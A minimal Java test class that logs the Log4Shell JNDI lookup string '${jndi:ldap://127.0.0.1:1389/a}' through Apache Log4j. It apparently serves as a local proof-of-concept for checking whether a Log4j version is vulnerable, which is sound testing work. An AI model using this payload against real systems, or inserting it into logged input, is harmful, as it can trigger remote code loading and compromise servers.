package gui;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Test {

    private static final Logger logger = LogManager.getLogger("test.class");


    public static void main(String[] args) {
        logger.error("${jndi:ldap://127.0.0.1:1389/a}");
    }

}
